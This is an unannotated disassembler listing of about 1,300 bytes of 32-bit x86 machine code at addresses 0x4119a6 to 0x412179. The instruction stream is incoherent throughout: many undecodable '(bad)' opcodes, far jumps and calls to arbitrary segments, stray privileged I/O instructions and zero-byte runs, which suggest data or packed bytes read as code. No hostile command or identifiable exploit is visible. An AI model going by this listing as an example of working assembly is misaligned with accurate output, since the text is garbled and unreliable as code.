  4119a6:	pop    esp
  4119a7:	jns    0x41195b
  4119a9:	add    eax,DWORD PTR [eax]
  4119ab:	cmc    
  4119ac:	sbb    cl,BYTE PTR [esi-0xefe4bf7]
  4119b2:	and    dh,BYTE PTR [edx+eiz*4]
  4119b5:	mov    esi,0x79185e87
  4119ba:	push   esp
  4119bb:	in     eax,dx
  4119bc:	pop    ecx
  4119be:	pop    es
  4119bf:	nop
  4119c0:	sbb    DWORD PTR [edx],eax
  4119c2:	jo     0x411a39
  4119c4:	jg     0x4119ca
  4119c6:	pop    edi
  4119c7:	add    BYTE PTR [eax],al
  4119c9:	add    BYTE PTR [eax],al
  4119cb:	add    cl,al
  4119cd:	mov    bl,0xc6
  4119cf:	inc    DWORD PTR [edx+0x9]
  4119d2:	add    dh,BYTE PTR [esi+eiz*4-0x12]
  4119d6:	add    eax,DWORD PTR [eax]
  4119d8:	push   ebp
  4119d9:	sbb    DWORD PTR [esi+0x2196846],ecx
  4119df:	xor    BYTE PTR [ebp-0x33],dh
  4119e2:	out    dx,al
  4119e3:	cmp    al,0x75
  4119e5:	sbb    edx,eax
  4119e7:	inc    DWORD PTR [esi+0xaffc6df]
  4119ed:	leave  
  4119ee:	add    esi,DWORD PTR [esi+edi*1-0x11]
  4119f2:	sbb    ch,al
  4119f4:	icebp  
  4119f5:	adc    eax,0x1f2d0002
  4119fa:	cmc    
  4119fb:	(bad)  
  4119fc:	jmp    0x783:0xe23f6d91
  411a03:	cmp    al,0xda
  411a05:	sbb    BYTE PTR [edx],al
  411a07:	add    BYTE PTR [ebx+0x47],dl
  411a0a:	jnp    0x4119d3
  411a0c:	mov    ah,0x1
  411a0e:	pusha  
  411a0f:	sti    
  411a10:	in     eax,dx
  411a11:	inc    esp
  411a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a13:	or     BYTE PTR [ebx+0x46766002],bh
  411a19:	add    ecx,DWORD PTR [ebp+0x8]
  411a1c:	bnd jl 0x4119ba
  411a1f:	or     BYTE PTR [ebx+0xcde5102],ah
  411a25:	clc    
  411a26:	nop
  411a27:	sbb    al,0xa9
  411a29:	xchg   edi,eax
  411a2a:	fistp  DWORD PTR [ecx*4+0xc36378]
  411a31:	add    BYTE PTR [eax],al
  411a33:	add    BYTE PTR [eax],al
  411a35:	add    DWORD PTR [edx],0x1d
  411a38:	sbb    al,0x66
  411a3a:	jns    0x411a9f
  411a3c:	ret    
  411a3d:	jae    0x411a41
  411a3f:	nop    DWORD PTR [esi-0x75]
  411a43:	je     0x411a04
  411a45:	arpl   WORD PTR [edx],ax
  411a47:	(bad)  
  411a48:	jp     0x411a3b
  411a4a:	push   esi
  411a4b:	test   BYTE PTR [edi],0x53
  411a4e:	mov    fs,WORD PTR [ebp-0x4800005]
  411a54:	and    BYTE PTR [edx],0xa
  411a57:	jo     0x4119da
  411a59:	pop    edx
  411a5a:	add    edi,edx
  411a5c:	pop    es
  411a5d:	dec    ecx
  411a5f:	jo     0x4119fb
  411a61:	ja     0x411abe
  411a63:	mov    esi,0x25b9730d
  411a68:	repnz dec edi
  411a6a:	cld    
  411a6b:	dec    ebp
  411a6c:	adc    edx,0x327af276
  411a72:	mov    gs,WORD PTR [esi+0x429b779a]
  411a78:	ud0    edi,DWORD PTR ds:0x8fa1889f
  411a7f:	adc    BYTE PTR ds:0x7aeb015e,al
  411a85:	mov    bl,0xc3
  411a87:	mov    BYTE PTR [edx],al
  411a89:	ficom  DWORD PTR [edi]
  411a8b:	add    BYTE PTR [ecx],bl
  411a8d:	xchg   edx,eax
  411a8e:	inc    esp
  411a8f:	add    BYTE PTR [edx-0x67],ah
  411a92:	mov    bl,BYTE PTR [ebx-0x1ff85e3]
  411a98:	add    BYTE PTR fs:[eax],al
  411a9b:	add    BYTE PTR [eax],al
  411a9d:	add    BYTE PTR [esi+0x7cc30576],cl
  411aa3:	jmp    0xacc5:0x276e5e0
  411aaa:	push   esi
  411aab:	add    al,BYTE PTR [eax]
  411aad:	jmp    0x624b0828
  411ab2:	mov    ah,0x11
  411ab4:	xchg   DWORD PTR [ebp+eiz*4+0x0],esp
  411ab8:	(bad)  
  411ab9:	es (bad) 
  411abb:	fmul   DWORD PTR [ebx+0x6a9ab3e5]
  411ac1:	jmp    0x61d4:0x6af7f821
  411ac8:	std    
  411ac9:	push   es
  411aca:	jp     0x411acd
  411acc:	sub    DWORD PTR [edx+eax*8+0x41348800],0x0
  411ad4:	(bad)  
  411ad5:	out    dx,al
  411ad6:	leave  
  411ad7:	xchg   BYTE PTR [esi+eiz*8],bh
  411ada:	jnp    0x411adc
  411adc:	push   cs
  411add:	xchg   esi,eax
  411ade:	clc    
  411adf:	adc    BYTE PTR [ebx-0x78fb86d3],cl
  411ae5:	and    al,0x8d
  411ae7:	cmp    al,0x43
  411ae9:	(bad)  
  411aeb:	add    eax,DWORD PTR [edi-0x267982c4]
  411af1:	cmp    eax,0xbd438c2f
  411af6:	cdq    
  411af7:	sub    al,0xc2
  411af9:	fiadd  DWORD PTR [edx+edx*8-0x8]
  411afd:	sub    edi,DWORD PTR [ebp+ecx*1-0x47]
  411b01:	ret    0x0
  411b04:	add    BYTE PTR [eax],al
  411b06:	add    BYTE PTR [esi-0x887fb72],ah
  411b0c:	jmp    0x3cf81b15
  411b11:	outs   dx,DWORD PTR ds:[esi]
  411b12:	adc    BYTE PTR [edi-0x2],cl
  411b15:	inc    BYTE PTR [ebx-0x37c4ff0b]
  411b1b:	iret   
  411b1c:	push   cs
  411b1d:	mov    bl,BYTE PTR [ebp-0x1f6a0]
  411b23:	dec    edi
  411b24:	mov    dl,ch
  411b26:	add    cl,dl
  411b28:	fpatan 
  411b2a:	inc    esi
  411b2b:	enter  0x7402,0x27
  411b2f:	stos   DWORD PTR es:[edi],eax
  411b30:	dec    edi
  411b31:	inc    ebx
  411b32:	adc    al,0x27
  411b34:	cmp    eax,0x54be180
  411b39:	add    BYTE PTR [eax],al
  411b3b:	pop    ebp
  411b3c:	sbb    eax,0x66c8305
  411b41:	xchg   DWORD PTR [ebp+0x60],ecx
  411b44:	jle    0x411b8a
  411b46:	enter  0xfb10,0x8a
  411b4a:	test   DWORD PTR [ecx+ecx*1],esp
  411b4d:	(bad)  
  411b4e:	jmp    FWORD PTR [ebx+0x4e]
  411b51:	add    DWORD PTR [eax],ecx
  411b53:	in     eax,0xc2
  411b55:	icebp  
  411b56:	mul    BYTE PTR [edx]
  411b58:	clc    
  411b59:	add    DWORD PTR [edx+esi*1-0x7],esi
  411b5d:	mov    dh,0x46
  411b5f:	inc    edx
  411b60:	jnp    0x411b27
  411b62:	shl    DWORD PTR [edi+edi*8],0x80
  411b66:	loope  0x411bb3
  411b68:	pop    es
  411b69:	add    BYTE PTR [eax],al
  411b6b:	add    BYTE PTR [eax],al
  411b6d:	add    BYTE PTR [eax],al
  411b6f:	add    BYTE PTR [edi+0x51890026],bl
  411b75:	sub    cl,BYTE PTR [edx-0x4c09cbbb]
  411b7b:	test   BYTE PTR [esp+eax*1],dl
  411b7e:	(bad)  
  411b7f:	call   FWORD PTR [edi*2-0x407a0fb4]
  411b86:	leave  
  411b87:	mov    edx,DWORD PTR [ecx-0x6]
  411b8a:	mov    dl,BYTE PTR [ebp+0x75]
  411b8d:	xchg   ebp,eax
  411b8e:	jns    0x411bd4
  411b90:	in     eax,dx
  411b91:	data16 daa 
  411b93:	jae    0x411c12
  411b95:	je     0x411b54
  411b97:	jmp    0x411b81
  411b99:	in     eax,dx
  411b9a:	cmp    BYTE PTR [edx],0xac
  411b9d:	cld    
  411b9e:	repz sub bh,BYTE PTR [esi+0x77e84122]
  411ba5:	stos   BYTE PTR es:[edi],al
  411ba6:	add    bh,0xba
  411ba9:	je     0x411bb2
  411bab:	repnz fisubr WORD PTR [ebp+eax*4-0x2d]
  411bb0:	jne    0x411b87
  411bb2:	fwait
  411bb3:	mov    bl,BYTE PTR [edi+0x2693ad04]
  411bb9:	popf   
  411bba:	cmp    BYTE PTR [ebp+esi*1+0x75fe0338],0xb5
  411bc2:	(bad)  
  411bc4:	or     BYTE PTR ds:0x20e14c77,cl
  411bca:	dec    ebp
  411bcb:	aas    
  411bcc:	jb     0x411be6
  411bce:	add    ecx,DWORD PTR [eax+eax*1+0xfe04a5]
  411bd5:	add    BYTE PTR [eax],al
  411bd7:	add    BYTE PTR [eax],al
  411bd9:	bound  esi,QWORD PTR [ebx+edi*1-0x19]
  411bdd:	(bad)  
  411bde:	xlat   BYTE PTR ds:[ebx]
  411bdf:	add    DWORD PTR [eax],eax
  411be1:	(bad)  
  411be2:	popf   
  411be3:	add    eax,0xd0763584
  411be8:	jmp    0x668e:0x93be748e
  411bef:	mov    ebp,0xc8d832fe
  411bf4:	mul    DWORD PTR [edx+0x5f0677ef]
  411bfa:	outs   dx,BYTE PTR ds:[esi]
  411bfb:	lods   eax,DWORD PTR ds:[esi]
  411bfc:	(bad)  
  411bfd:	sbb    al,al
  411bff:	mov    ss,WORD PTR [ebx]
  411c01:	div    BYTE PTR [ebp-0x43]
  411c04:	dec    BYTE PTR [edx]
  411c06:	mov    al,0x2
  411c08:	je     0x411c6e
  411c0a:	add    dh,BYTE PTR [ecx-0x44]
  411c0d:	jne    0x411c4b
  411c0f:	fs scas al,BYTE PTR es:[edi]
  411c11:	repz (bad) 
  411c13:	xchg   esi,eax
  411c14:	(bad)  
  411c15:	jo     0x411c5e
  411c17:	rol    BYTE PTR [esi+0x7a4b7406],cl
  411c1d:	pop    ecx
  411c1e:	push   cs
  411c1f:	mov    edx,0x7b458d43
  411c24:	xchg   DWORD PTR [ecx],esi
  411c26:	cmp    DWORD PTR [esp+edi*1],esp
  411c29:	inc    esi
  411c2a:	cmp    BYTE PTR [edx-0x17],dl
  411c2d:	imul   edi,DWORD PTR [eax+0x5a0178e9],0x56
  411c34:	add    al,0xab
  411c36:	push   cs
  411c37:	xchg   ebp,eax
  411c38:	(bad)  
  411c39:	jp     0x411c76
  411c3b:	lods   al,BYTE PTR ds:[esi]
  411c3c:	sldt   WORD PTR [eax]
  411c3f:	add    BYTE PTR [eax],al
  411c41:	add    BYTE PTR [ebx-0x7a],ch
  411c44:	sub    eax,DWORD PTR [ebx]
  411c46:	jne    0x411c4a
  411c48:	test   eax,0xf2fe217a
  411c4d:	scas   al,BYTE PTR es:[edi]
  411c4e:	outs   dx,BYTE PTR ds:[esi]
  411c4f:	je     0x411c59
  411c51:	sbb    bh,BYTE PTR [eax-0x7dfc18ff]
  411c57:	mov    ah,0xe9
  411c59:	enter  0xf6b1,0xde
  411c5d:	jg     0x411c83
  411c5f:	add    esp,edi
  411c61:	add    esi,DWORD PTR [edi-0x70f86b75]
  411c67:	push   edi
  411c68:	jecxz  0x411bfb
  411c6a:	pop    edi
  411c6b:	in     al,dx
  411c6c:	inc    ebx
  411c6d:	add    esi,DWORD PTR [ebp+0x2]
  411c70:	and    BYTE PTR [ecx+0x3defd91],cl
  411c76:	add    DWORD PTR [esi+0x275046f],0x12
  411c7d:	pop    ecx
  411c7e:	add    eax,0x75936d0e
  411c83:	add    ah,bh
  411c85:	out    dx,al
  411c86:	xchg   edi,eax
  411c87:	add    DWORD PTR [eax],0xfdffb174
  411c8d:	scas   al,BYTE PTR es:[edi]
  411c8e:	jns    0x411d06
  411c90:	sub    dl,ah
  411c92:	popf   
  411c93:	xchg   edx,eax
  411c94:	jbe    0x411ccf
  411c96:	jbe    0x411d0e
  411c98:	in     al,0x62
  411c9a:	cmp    al,0xfe
  411c9c:	std    
  411c9d:	adc    al,0x9
  411c9f:	mov    dl,BYTE PTR [ebx-0x20389d3]
  411ca5:	jle    0x411ca7
  411ca7:	add    BYTE PTR [eax],al
  411ca9:	add    BYTE PTR [eax],al
  411cab:	or     al,0x43
  411cad:	std    
  411cae:	jbe    0x411d26
  411cb0:	jmp    0x411cc5
  411cb2:	xlat   BYTE PTR ds:[ebx]
  411cb3:	jbe    0x411cb7
  411cb5:	mov    DWORD PTR [edx+edi*4+0x6ed4c081],edi
  411cbc:	jmp    0x411ce9
  411cbe:	bound  esi,QWORD PTR [esi+eax*2-0x7789b103]
  411cc5:	inc    ebx
  411cc6:	pop    ecx
  411cc7:	jb     0x411c90
  411cc9:	cmp    DWORD PTR [ecx],ebx
  411ccb:	or     ebx,DWORD PTR [edx+ecx*4]
  411cce:	fs sub eax,0xf22efdff
  411cd4:	shr    BYTE PTR [ecx],0x2e
  411cd7:	cmp    DWORD PTR [edx],ecx
  411cd9:	jae    0x411cd4
  411cdb:	sti    
  411cdc:	(bad)  
  411cdd:	call   FWORD PTR [edx+eax*4+0x77b48b88]
  411ce4:	cld    
  411ce5:	std    
  411ce6:	shr    DWORD PTR [esi-0x470f8e03],0x85
  411ced:	push   ebx
  411cee:	cmc    
  411cef:	mov    edx,DWORD PTR [ecx+0xc]
  411cf2:	jnp    0x411cd5
  411cf4:	cmp    DWORD PTR [edx-0x1a],0x6a207165
  411cfb:	xor    eax,0x77d6fd42
  411d00:	add    dh,BYTE PTR [eax+eiz*8-0x5]
  411d04:	mov    eax,0x330040
  411d09:	inc    BYTE PTR [edx]
  411d0b:	dec    ecx
  411d0c:	adc    BYTE PTR [edi],dh
  411d0e:	push   ebp
  411d0f:	add    BYTE PTR [eax],al
  411d11:	add    BYTE PTR [eax],al
  411d13:	add    BYTE PTR [eax],dl
  411d15:	je     0x411d1c
  411d17:	add    BYTE PTR [esi],0xf
  411d1a:	jno    0x411d20
  411d1c:	dec    esi
  411d1d:	(bad)  
  411d1e:	push   ecx
  411d1f:	cld    
  411d20:	addr16 cmp al,0x33
  411d24:	adc    eax,0xc50c798e
  411d29:	push   ecx
  411d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d2b:	jne    0x411d9c
  411d2d:	aas    
  411d2e:	dec    ecx
  411d2f:	lock shl BYTE PTR [edx-0x79],1
  411d33:	(bad)  
  411d34:	mov    bh,0xc6
  411d36:	cmp    eax,ebp
  411d38:	iret   
  411d39:	add    BYTE PTR [eax],al
  411d3b:	jge    0x411d3c
  411d3d:	xor    eax,eax
  411d3f:	cmp    ecx,esp
  411d41:	hlt    
  411d42:	or     ebx,DWORD PTR [ebp+0x3bc2045c]
  411d48:	fnop   
  411d4a:	jbe    0x411d90
  411d4c:	jne    0x411da1
  411d4e:	fdiv   QWORD PTR [eax+esi*4+0x3b]
  411d52:	ret    
  411d53:	nop    DWORD PTR [esi-0x3]
  411d57:	dec    DWORD PTR [edi+ecx*1+0x3bcc08b6]
  411d5e:	dec    ecx
  411d5f:	lock or BYTE PTR [esi],ah
  411d62:	aaa    
  411d63:	dec    ebp
  411d64:	nop
  411d65:	jae    0x411d80
  411d67:	cmp    ebx,DWORD PTR [ebx+0x54ebee75]
  411d6d:	cmp    eax,0x5adf0fc3
  411d72:	std    
  411d73:	call   FWORD PTR [ecx+edx*1-0x4a]
  411d77:	or     BYTE PTR [eax],al
  411d79:	add    BYTE PTR [eax],al
  411d7b:	add    BYTE PTR [eax],al
  411d7d:	or     al,0x3d
  411d7f:	dec    ecx
  411d80:	lock cwde 
  411d82:	or     BYTE PTR [edi],dh
  411d84:	(bad)  
  411d85:	into   
  411d86:	cmc    
  411d87:	out    0x1,eax
  411d89:	jne    0x411dac
  411d8b:	cmp    eax,ebp
  411d8d:	jb     0x411df7
  411d8f:	cmp    eax,0x8aea1aff
  411d94:	inc    ebx
  411d95:	and    eax,0xfefc7d71
  411d9a:	push   ds
  411d9b:	nop
  411d9c:	xor    DWORD PTR ds:0xfa50541a,esi
  411da2:	pop    esi
  411da3:	and    al,0xfd
  411da5:	repnz pushf 
  411da7:	lea    ecx,[ebx-0x2006b63]
  411dad:	inc    esp
  411dae:	inc    DWORD PTR ds:0xcf704250
  411db4:	xchg   DWORD PTR [eax+0x61],edx
  411db7:	mov    DWORD PTR [ebx+0x15],edi
  411dba:	arpl   WORD PTR [ebp-0x933dd8],ax
  411dc0:	call   0xfe405122
  411dc5:	data16 xor cl,BYTE PTR [ebx-0x7a599328]
  411dcc:	je     0x411e3c
  411dce:	adc    cl,BYTE PTR [ebp-0x18]
  411dd1:	and    bl,ch
  411dd3:	mov    WORD PTR [ebx-0x2b],es
  411dd6:	jb     0x411e1d
  411dd8:	call   0xfc5f4ed1
  411ddd:	sub    BYTE PTR [edi+ecx*1],0x84
  411de1:	add    BYTE PTR [eax],al
  411de3:	add    BYTE PTR [eax],al
  411de5:	add    BYTE PTR [edx-0xbfffe17],cl
  411deb:	pop    ds
  411dec:	sbb    edi,esp
  411dee:	push   0x14
  411df0:	js     0x411e0f
  411df2:	sbb    eax,0x5afdfded
  411df7:	rcr    cl,0x74
  411dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dfb:	in     al,dx
  411dfc:	(bad)  
  411dfd:	fidiv  DWORD PTR [ebp-0x17]
  411e00:	add    DWORD PTR [edi+0x3e],edi
  411e03:	retf   
  411e04:	std    
  411e05:	std    
  411e06:	cmp    al,BYTE PTR [edx]
  411e08:	gs or  al,0x6c
  411e0b:	fldz   
  411e0d:	xchg   BYTE PTR [edi],bh
  411e0f:	add    ah,bh
  411e11:	add    ebp,esp
  411e13:	jl     0x411de0
  411e15:	dec    eax
  411e16:	xlat   BYTE PTR fs:[ebx]
  411e18:	add    BYTE PTR [edi+0x29],bl
  411e1b:	jbe    0x411e6d
  411e1d:	lea    esi,[esi-0x4a610f02]
  411e23:	sti    
  411e24:	scas   al,BYTE PTR es:[edi]
  411e25:	add    BYTE PTR [eax+0x946e232],al
  411e2b:	outs   dx,DWORD PTR ds:[esi]
  411e2c:	inc    eax
  411e2d:	add    DWORD PTR [ecx-0x1a],esp
  411e30:	bound  ecx,QWORD PTR [esi+0x9]
  411e33:	sti    
  411e34:	push   esp
  411e35:	inc    ebx
  411e36:	fdivr  st,st(2)
  411e38:	xchg   BYTE PTR [esi+0x7e45e6],cl
  411e3e:	retf   
  411e3f:	jmp    0x2b63619
  411e44:	fs ret 
  411e46:	push   0x38685
  411e4b:	add    BYTE PTR [eax],al
  411e4d:	add    BYTE PTR [eax],al
  411e4f:	jne    0x411e53
  411e51:	push   edx
  411e52:	cmp    esp,DWORD PTR [edx+0x7d]
  411e55:	outs   dx,DWORD PTR ds:[esi]
  411e56:	ja     0x411e38
  411e58:	xchg   ah,cl
  411e5a:	fwait
  411e5b:	mov    WORD PTR [ebx+0x26e94e72],?
  411e61:	ins    BYTE PTR es:[edi],dx
  411e62:	inc    edi
  411e63:	mov    dl,bh
  411e65:	ss cmp al,0xc2
  411e68:	jb     0x411e72
  411e6a:	mov    gs,esi
  411e6c:	push   ebp
  411e6d:	add    BYTE PTR es:[ebx+0x3b],dh
  411e71:	out    dx,eax
  411e72:	jbe    0x411df4
  411e74:	test   DWORD PTR [edi+eax*2+0x60],edx
  411e78:	cli    
  411e79:	push   cs
  411e7a:	add    ah,cl
  411e7c:	jne    0x411eef
  411e7e:	xchg   BYTE PTR [esi-0x3000107],ah
  411e84:	inc    edi
  411e85:	add    ch,dh
  411e87:	jg     0x411ec2
  411e89:	push   DWORD PTR [ebx+edx*8-0x7f]
  411e8d:	jnp    0x411e74
  411e8f:	jo     0x411eee
  411e91:	fcom   DWORD PTR [esp+edx*4+0x3b]
  411e95:	jnp    0x411e68
  411e97:	stos   BYTE PTR es:[edi],al
  411e98:	pop    edx
  411e99:	or     BYTE PTR [esi+0x1a],0xe
  411e9d:	jae    0x411eb5
  411e9f:	dec    esi
  411ea0:	jge    0x411e9a
  411ea2:	cmp    bl,BYTE PTR [edi-0x7e]
  411ea5:	cmp    eax,0xf6257de3
  411eaa:	daa    
  411eab:	and    dh,BYTE PTR gs:[ebx+0x6]
  411eaf:	idiv   BYTE PTR [ebp+0x9e40]
  411eb5:	add    BYTE PTR [eax],al
  411eb7:	add    dl,ch
  411eb9:	idiv   edi
  411ebb:	sbb    al,0x87
  411ebd:	cmp    DWORD PTR [ebx-0x20825d7],0xffffffeb
  411ec4:	dec    edx
  411ec5:	add    DWORD PTR [ecx-0x208c2c4],eax
  411ecb:	jbe    0x411f44
  411ecd:	jne    0x411ed3
  411ecf:	es call 0x144a1b52
  411ed5:	mov    esi,0xf76d7c89
  411eda:	std    
  411edb:	push   esi
  411edc:	nop
  411edd:	aad    0xfc
  411edf:	dec    esi
  411ee0:	call   0xd933:0x6852d933
  411ee7:	cli    
  411ee8:	mov    edi,DWORD PTR [edi]
  411eea:	cmp    DWORD PTR [esi],edx
  411eec:	std    
  411eed:	pop    ecx
  411eee:	jg     0x411f22
  411ef0:	pop    eax
  411ef1:	idiv   ch
  411ef3:	es in  eax,dx
  411ef5:	push   edx
  411ef6:	sbb    DWORD PTR [esi+edx*2-0x101a8bfe],0x5a0e348c
  411f01:	idiv   ebp
  411f03:	add    BYTE PTR [ecx],dh
  411f05:	push   ecx
  411f06:	ret    
  411f07:	inc    ebx
  411f08:	pop    esp
  411f09:	imul   esi,esp,0x58
  411f0c:	rcr    ebp,1
  411f0e:	je     0x411f1b
  411f10:	pop    es
  411f11:	fnsave [edi+eax*1-0x59]
  411f15:	(bad)  
  411f16:	in     eax,0xa9
  411f18:	sbb    al,0x5
  411f1a:	add    BYTE PTR [ebx+0x0],cl
  411f20:	add    BYTE PTR [ecx-0x1a],bl
  411f23:	or     ecx,0x7d7f1ec0
  411f29:	xor    dh,bh
  411f2b:	or     cl,BYTE PTR [esi+0x594]
  411f31:	ja     0x411f86
  411f33:	or     BYTE PTR [ebx+0xa850e61],cl
  411f39:	addr16 push edx
  411f3b:	clc    
  411f3c:	sub    ebx,DWORD PTR [ecx-0x2fb57afa]
  411f42:	in     eax,0x82
  411f44:	add    ah,cl
  411f46:	add    al,0x7f
  411f48:	enter  0xebfb,0x79
  411f4c:	mov    eax,ecx
  411f4e:	adc    BYTE PTR ds:0x3e70ec4d,dh
  411f54:	or     DWORD PTR [edx+0x1],0x7c
  411f58:	and    ch,BYTE PTR [ecx]
  411f5a:	add    DWORD PTR [ecx-0x407b408],esi
  411f60:	push   eax
  411f61:	pop    ss
  411f62:	mov    dh,BYTE PTR [edi+edi*8]
  411f65:	sub    edi,eax
  411f67:	jg     0x411f29
  411f69:	test   BYTE PTR [edi+eax*4+0x45],dl
  411f6d:	lods   al,BYTE PTR ds:[esi]
  411f6e:	add    eax,0x8
  411f71:	fdivr  st(7),st
  411f73:	adc    DWORD PTR [edx+eiz*4+0x44],ecx
  411f77:	add    BYTE PTR [ebx+0x753507a0],al
  411f7d:	les    esi,FWORD PTR [ebp+0x6]
  411f80:	mov    DWORD PTR [ebp+0x4e],esi
  411f83:	popa   
  411f84:	std    
  411f85:	add    BYTE PTR [eax],al
  411f87:	add    BYTE PTR [eax],al
  411f89:	add    BYTE PTR [edx+0x9],bl
  411f8c:	mov    cl,BYTE PTR [ebx-0x201ff77]
  411f92:	dec    edx
  411f93:	iret   
  411f94:	push   ebp
  411f95:	lds    esi,FWORD PTR [esi-0x2a447d17]
  411f9b:	call   0x55b71d9b
  411fa0:	or     BYTE PTR [ecx],dh
  411fa2:	xor    eax,0xb8890cd5
  411fa7:	sbb    DWORD PTR [ecx-0x344c8d7],0x7eec1381
  411fb1:	add    al,0x46
  411fb3:	test   eax,0x16ee17e7
  411fb8:	pushf  
  411fb9:	sub    DWORD PTR [eax-0x7ab478a7],esp
  411fbf:	jb     0x411fd2
  411fc1:	mov    DWORD PTR [eax+0x75],eax
  411fc4:	daa    
  411fc5:	push   ebx
  411fc6:	add    eax,0xce045163
  411fcb:	in     al,dx
  411fcc:	addr16 (bad) 
  411fce:	sub    eax,0xbc595e20
  411fd3:	stos   DWORD PTR es:[edi],eax
  411fd4:	adc    al,0x0
  411fd6:	sub    BYTE PTR [eax+esi*8+0x4f],ah
  411fda:	and    al,0x1c
  411fdc:	push   esi
  411fdd:	mov    DWORD PTR [eax-0x6f],ebp
  411fe0:	adc    al,BYTE PTR [eax+0x75]
  411fe3:	shl    DWORD PTR [ecx-0x316ca8c],1
  411fe9:	xor    eax,0xbc6c2f9a
  411fee:	add    BYTE PTR [eax],al
  411ff0:	add    BYTE PTR [eax],al
  411ff2:	add    BYTE PTR [ecx],cl
  411ff4:	test   eax,0x7442fd01
  411ff9:	fdiv   st(5),st
  411ffb:	stos   DWORD PTR es:[edi],eax
  411ffc:	ins    BYTE PTR es:[edi],dx
  411ffd:	gs clc 
  411fff:	jne    0x412065
  412001:	hlt    
  412002:	or     DWORD PTR [esi+0x2],0xffffff9b
  412006:	sub    esi,esi
  412008:	out    dx,eax
  412009:	xchg   ebx,eax
  41200a:	daa    
  41200b:	out    dx,al
  41200c:	cmp    al,0x13
  41200e:	push   esp
  41200f:	iret   
  412010:	add    cl,BYTE PTR [esi]
  412012:	ja     0x412091
  412014:	neg    DWORD PTR [edx]
  412016:	xchg   DWORD PTR ds:0xc6fcd46d,esi
  41201c:	push   es
  41201d:	(bad)  
  41201e:	lds    edi,FWORD PTR [eax]
  412020:	ins    DWORD PTR es:[edi],dx
  412021:	jmp    0x41200e
  412023:	add    BYTE PTR [edx],0xe7
  412026:	add    ebp,DWORD PTR [eax]
  412028:	ins    DWORD PTR es:[edi],dx
  412029:	fisttp DWORD PTR [edx-0x2a29054a]
  41202f:	in     al,dx
  412030:	cmp    al,0xcf
  412032:	pop    ebp
  412033:	lods   al,BYTE PTR ds:[esi]
  412034:	leave  
  412035:	test   eax,0x724d750b
  41203a:	out    dx,eax
  41203b:	hlt    
  41203c:	in     eax,0x23
  41203e:	push   ecx
  41203f:	mov    ds:0x87abf48b,eax
  412044:	inc    edx
  412045:	out    0x54,eax
  412047:	cld    
  412048:	stc    
  412049:	paddq  mm5,QWORD PTR [ecx+0x42]
  41204d:	out    0xfc,eax
  41204f:	mov    al,ds:0x73f024bf
  412054:	add    ah,bh
  412056:	add    eax,DWORD PTR [eax]
  412058:	add    BYTE PTR [eax],al
  41205a:	add    BYTE PTR [eax],al
  41205c:	enter  0xfcf,0xf0
  412060:	dec    ecx
  412061:	inc    edx
  412062:	out    0xfc,eax
  412064:	or     BYTE PTR [ebx+0x69cbfc8f],0xeb
  41206b:	jbe    0x4120a2
  41206d:	add    bl,BYTE PTR [esi+0x34]
  412070:	cli    
  412071:	cmp    al,0x57
  412073:	cld    
  412074:	ret    
  412075:	xor    dl,BYTE PTR [ebp-0x76]
  412078:	ss jmp 0x2fa:0x7e78de02
  412080:	jne    0x412084
  412082:	add    al,dh
  412084:	add    esi,edx
  412086:	or     eax,0xfdf59c65
  41208b:	jmp    0x654edd3d
  412090:	xchg   esp,eax
  412091:	cmc    
  412092:	std    
  412093:	jmp    0xba356283
  412098:	add    eax,DWORD PTR [edx-0x4]
  41209b:	cdq    
  41209c:	push   DWORD PTR [ecx-0x8]
  41209f:	jo     0x41206c
  4120a1:	test   BYTE PTR [edi-0x2e07bd84],0x64
  4120a8:	or     BYTE PTR ss:[ebx+0x271eb],al
  4120af:	jb     0x412065
  4120b1:	out    dx,al
  4120b2:	cmp    DWORD PTR [edi-0x160a8192],ebp
  4120b8:	jbe    0x4120bc
  4120ba:	aaa    
  4120bb:	cmp    al,0xd
  4120bd:	or     BYTE PTR [edi+ecx*8+0x0],al
  4120c4:	add    BYTE PTR [ecx+0x2],bh
  4120c7:	add    cl,al
  4120c9:	out    dx,al
  4120ca:	outs   dx,BYTE PTR ds:[esi]
  4120cb:	(bad)  
  4120cc:	call   0xc77afbd4
  4120d1:	jle    0x412151
  4120d3:	fucomp st(1)
  4120d5:	jbe    0x4120d9
  4120d7:	push   ecx
  4120d8:	xchg   esi,eax
  4120d9:	fs out dx,al
  4120db:	std    
  4120dc:	adc    al,0xcd
  4120de:	not    DWORD PTR [ebx+0x79]
  4120e1:	hlt    
  4120e2:	ret    0xc073
  4120e5:	xor    DWORD PTR [ecx-0x4],0x79898aff
  4120ec:	mov    ecx,0xdcfd2faf
  4120f1:	jb     0x4120ea
  4120f3:	adc    ecx,DWORD PTR [ecx+0x6c00428b]
  4120f9:	mov    cl,0x6e
  4120fb:	or     DWORD PTR [edi+0x4cbffb],esp
  412101:	ja     0x412176
  412103:	cld    
  412104:	jb     0x41212a
  412106:	in     eax,0x11
  412108:	imul   edi,DWORD PTR [edx],0x4a
  41210b:	push   0x10
  41210d:	pop    edi
  41210e:	in     al,dx
  41210f:	push   esi
  412110:	lea    ebx,[ecx]
  412112:	fst    DWORD PTR [eax-0x18]
  412115:	mov    edi,0xcffffd72
  41211a:	arpl   sp,di
  41211c:	add    BYTE PTR [edi],ch
  41211e:	repz dec edi
  412120:	call   0x3e860c
  412125:	xor    eax,0xffc72
  41212a:	add    BYTE PTR [eax],al
  41212c:	add    BYTE PTR [eax],al
  41212e:	leave  
  41212f:	xchg   DWORD PTR [eax],eax
  412131:	add    BYTE PTR [edx+ecx*4],bl
  412134:	inc    ecx
  412135:	clc    
  412136:	ins    BYTE PTR es:[edi],dx
  412137:	sub    eax,0x506b47fb
  41213c:	sti    
  41213d:	adc    eax,0x4012f4
  412142:	cdq    
  412143:	shl    DWORD PTR [ecx+0x76],0x75
  412147:	jae    0x412141
  412149:	je     0x412188
  41214b:	xchg   DWORD PTR [ecx-0x48],esi
  41214e:	add    eax,0xe476ec72
  412153:	data16 adc BYTE PTR [eax+0x70],ch
  412157:	jae    0x412199
  412159:	add    BYTE PTR [ecx+0x42],dl
  41215c:	mov    esp,0x746af450
  412161:	add    esp,ebx
  412163:	add    DWORD PTR [ecx-0x48],0x67
  412167:	mov    esi,0x398c71c
  41216c:	rol    BYTE PTR [esp+ecx*8],1
  41216f:	add    BYTE PTR [eax],al
  412171:	mov    ebx,DWORD PTR [ecx-0x4a]
  412174:	shl    BYTE PTR [bx+si-0x79],0x7c
  412179:	add    eax,0xb8418450
